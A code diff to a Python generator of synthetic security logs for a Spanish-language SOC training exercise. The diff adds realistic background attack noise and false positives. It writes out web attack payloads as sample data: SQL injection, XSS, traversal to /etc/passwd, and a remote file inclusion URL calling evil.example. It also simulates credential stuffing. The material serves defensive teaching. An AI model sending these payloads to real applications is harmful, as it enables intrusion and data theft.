@@ -11,8 +11,9 @@ Dos objetivos pedagógicos:
    que aplicar el patrón de exclusiones (allowlisting) en vez de aflojar la
    detección:
 
-   FP-1  Escáner de vulnerabilidades interno (los martes) golpea el WAF con
-         firmas de SQLi/XSS desde 10.20.12.50 → parece el recon del atacante.
+   FP-1  Escáner de vulnerabilidades interno: barre el WAF todas las madrugadas
+         (más fuerte los martes) con firmas de SQLi/XSS desde 10.20.12.50
+         → parece el recon del atacante.
    FP-2  SCCM/despliegue de software lanza `powershell.exe -enc <base64>` en
          estaciones, firmado por Microsoft, desde ccmexec.exe → parece la
          ejecución del atacante.
@@ -22,7 +23,7 @@ Dos objetivos pedagógicos:
          → parece C2.
    FP-5  Ráfagas de logon fallido de `svc_sql` por una contraseña vencida
          → parece password spraying.
-   FP-6  El mismo escáner Nessus barre la red interna los martes: dispara firmas
+   FP-6  El mismo escáner Nessus barre la red interna de madrugada: dispara firmas
          de scan y de host sweep DESDE UNA IP INTERNA → parece el escaneo lateral
          del atacante desde la DMZ.
    FP-7  Ruido de fondo de Internet: escaneos de puertos contra el perímetro a
@@ -41,7 +42,7 @@ import random
 from datetime import datetime, timedelta
 
 from generators import (
-    BENIGN_DST, ORG, SERVERS, USERS, WEB_PATHS_OK, WORKSTATIONS, Env,
+    BENIGN_DST, ORG, SERVERS, USERS, WORKSTATIONS, Env, ruta_realista,
     auth_event, edr_agent_event, edr_network_event, edr_prevention_event,
     edr_process_event, fw_dns_event, fw_event, fw_threat_event, waf_event,
 )
@@ -66,6 +67,52 @@ BENIGN_PROCS = [
     ("notepad.exe", "C:\\Windows\\System32\\notepad.exe", "Microsoft Corporation"),
     ("msedge.exe", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
      "Microsoft Corporation"),
+]
+
+# Mezcla realista de lo que recibe una aplicación web pública. La proporción
+# importa: la mayoría es ruido de baja severidad, y la SQLi está presente pero
+# SIEMPRE bloqueada — para que la única no bloqueada (la del ataque) destaque
+# solo si el analista mira el código de respuesta HTTP.
+def _ua_escaner(rng):
+    return rng.choice([
+        "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
+        "sqlmap/1.8.2#stable (https://sqlmap.org)",
+        "Mozilla/5.0 (Nikto/2.5.0)",
+        "python-requests/2.31.0",
+        "Go-http-client/1.1",
+        "curl/8.4.0",
+    ])
+
+_ATAQUES_FONDO = [
+    ("Illegal Resource Access",
+     ["/wp-login.php", "/.env", "/admin", "/phpmyadmin/", "/.git/config",
+      "/backup.sql", "/config.json", "/server-status"], 3, _ua_escaner),
+    ("Web Scanner Detected",
+     ["/", "/robots.txt", "/sitemap.xml", "/api/v1/", "/swagger.json"], 5, _ua_escaner),
+    ("SQL Injection",
+     ["/buscar?q=1%27+OR+%271%27%3D%271", "/producto/ver?id=1+UNION+SELECT+NULL",
+      "/api/v1/precios?sku=1%27--", "/catalogo?seccion=1%3B+DROP+TABLE+users--"], 7, _ua_escaner),
+    ("Cross Site Scripting",
+     ["/buscar?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "/comentario?texto=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"], 6, _ua_escaner),
+    ("Directory Traversal",
+     ["/descargar?f=..%2F..%2F..%2Fetc%2Fpasswd",
+      "/static/..%5C..%5Cwindows%5Cwin.ini"], 6, _ua_escaner),
+    ("Bot Access Control",
+     ["/catalogo", "/producto/ver", "/api/v1/precios"], 2,
+     "Mozilla/5.0 (compatible; SemrushBot/7~bl)"),
+    ("Remote File Inclusion",
+     ["/index.php?page=http%3A%2F%2Fevil.example%2Fsh.txt"], 7, _ua_escaner),
+    ("Protocol Anomaly",
+     ["/", "/checkout"], 4, "Mozilla/5.0"),
+]
+_PESOS_FONDO = [30, 16, 16, 13, 9, 8, 4, 4]
+
+# Cuentas de clientes de la tienda. Son las que aparecen en suser.
+_CLIENTES = [
+    "acastro", "mlopez", "jrodriguez", "ngomez", "fperalta", "srivas",
+    "tmolina", "cbermudez", "ealvarez", "pquintero", "vsalazar", "iduran",
+    "lmarin", "ocardenas", "wpineda", "ymejia", "bhurtado", "gnavarro",
 ]
 
 PUBLIC_CLIENT_IPS = [
@@ -107,26 +154,71 @@ def generate_baseline(env: Env, start: datetime, hours: int, eps_scale: float = 
         for _ in range(int(900 * w)):
             ts = hour_start + timedelta(seconds=rng.randint(0, 3599),
                                         microseconds=rng.randint(0, 999999))
-            path = rng.choice(WEB_PATHS_OK)
+            path = ruta_realista(rng)
             status = rng.choices([200, 200, 200, 302, 304, 404, 500],
                                  weights=[70, 10, 5, 6, 4, 4, 1])[0]
+            # Las zonas privadas exigen sesión; el catálogo público no.
+            privada = any(x in path for x in ("/cuenta/", "/carrito", "/checkout"))
+            cuenta = rng.choice(_CLIENTES) if (privada or rng.random() < 0.28) else ""
+            metodo = "POST" if path.startswith("/cuenta/login") else \
+                     rng.choices(["GET", "POST"], weights=[85, 15])[0]
+            cuerpo = ""
+            if path == "/cuenta/login":
+                # El WAF extrae los campos del formulario. La contraseña va
+                # enmascarada: un log que guarde credenciales en claro es un
+                # incidente en sí mismo, y conviene decirlo en voz alta en clase.
+                cuenta = rng.choice(_CLIENTES)
+                cuerpo = f"usuario={cuenta}&clave=%2A%2A%2A%2A%2A%2A&recordar=1"
+                status = rng.choices([302, 302, 401], weights=[70, 15, 15])[0]
             out["waf"].append(waf_event(
-                ts, _public_ip(rng), path,
-                method=rng.choices(["GET", "POST"], weights=[85, 15])[0],
-                status=status, action="allow",
+                ts, _public_ip(rng), path, method=metodo,
+                status=status, action="allow", account=cuenta, payload=cuerpo,
                 bytes_in=rng.randint(300, 2500), bytes_out=rng.randint(500, 90000),
                 rng=rng,
             ))
 
-        # Bots y escaneos de fondo de Internet: ruido de baja severidad
-        for _ in range(int(25 * w)):
+        # ── Ruido de ataque de fondo de Internet ──────────────────────────
+        # Una tienda pública recibe esto todo el día. Es el pajar dentro del cual
+        # hay que encontrar la aguja: la SQLi de la F2 que NO fue bloqueada.
+        # Todo lo de aquí se bloquea o termina en 4xx, así que una detección que
+        # exija respuesta HTTP exitosa no se ensucia con este ruido.
+        for _ in range(int(28 * w)):
             ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
+            firma, rutas, sev, ua = rng.choices(_ATAQUES_FONDO, weights=_PESOS_FONDO)[0]
+            # 15 % de las políticas están en modo alerta, pero la aplicación
+            # responde 403/404 igual: la acción del WAF por sí sola no basta
+            # para saber si el ataque funcionó.
+            if rng.random() < 0.15:
+                accion, status = "alert", rng.choice([403, 404])
+            else:
+                accion, status = "block", 403
             out["waf"].append(waf_event(
-                ts, _public_ip(rng),
-                rng.choice(["/wp-login.php", "/.env", "/admin", "/phpmyadmin/"]),
-                status=404, action="block", signature="Illegal Resource Access",
-                severity=3, rng=rng,
+                ts, _public_ip(rng), rng.choice(rutas),
+                method="POST" if firma == "Remote File Inclusion" else "GET",
+                status=status, action=accion, signature=firma, severity=sev,
+                user_agent=ua(rng) if callable(ua) else ua,
+                bytes_in=rng.randint(200, 1400), bytes_out=rng.randint(200, 900),
+                rng=rng,
             ))
+
+        # Ráfagas de credential stuffing contra el login (2-3 al día)
+        if rng.random() < 0.09:
+            origen = _public_ip(rng)
+            inicio = hour_start + timedelta(seconds=rng.randint(0, 3000))
+            for i in range(rng.randint(18, 45)):
+                victima = rng.choice(_CLIENTES)
+                out["waf"].append(waf_event(
+                    inicio + timedelta(seconds=i * rng.randint(2, 6)),
+                    origen, "/cuenta/login", method="POST",
+                    status=rng.choices([401, 401, 401, 403], weights=[70, 15, 10, 5])[0],
+                    action="alert" if i < 10 else "block",
+                    signature="Credential Stuffing", severity=6,
+                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                    account=victima,
+                    payload=f"usuario={victima}&clave=%2A%2A%2A%2A%2A%2A",
+                    bytes_in=rng.randint(180, 320), bytes_out=rng.randint(90, 400),
+                    rng=rng,
+                ))
 
         # ---------------- Firewall: salida a Internet ----------------
         for _ in range(int(700 * w)):
@@ -211,9 +303,12 @@ def _inject_false_positives(out: dict, env: Env, hour_start: datetime,
     h = hour_start.hour
     dow = hour_start.weekday()  # 0=lunes
 
-    # FP-1 — escáner de vulnerabilidades interno, martes 02:00-04:00
-    if dow == 1 and 2 <= h < 4:
-        for _ in range(180):
+    # FP-1 — escáner de vulnerabilidades interno.
+    # Barrido ligero TODAS las madrugadas (así siempre cae dentro de una ventana
+    # de 48 h) y barrido completo los martes.
+    if 2 <= h < 4:
+        intensidad = 180 if dow == 1 else 45
+        for _ in range(intensidad):
             ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
             sig = rng.choice(["SQL Injection", "Cross Site Scripting",
                               "Directory Traversal", "Web Scanner Detected"])
@@ -278,7 +373,7 @@ def _inject_false_positives(out: dict, env: Env, hour_start: datetime,
         ))
 
     # FP-6 — el escáner interno también barre la red, no solo el WAF
-    if dow == 1 and 2 <= h < 4:
+    if 2 <= h < 4:
         for i, destino in enumerate(["10.20.40.5", "10.20.40.21", "10.20.40.31",
                                      "10.20.30.11", "10.20.30.12"]):
             ts = hour_start + timedelta(minutes=i * 9 + rng.randint(0, 5))
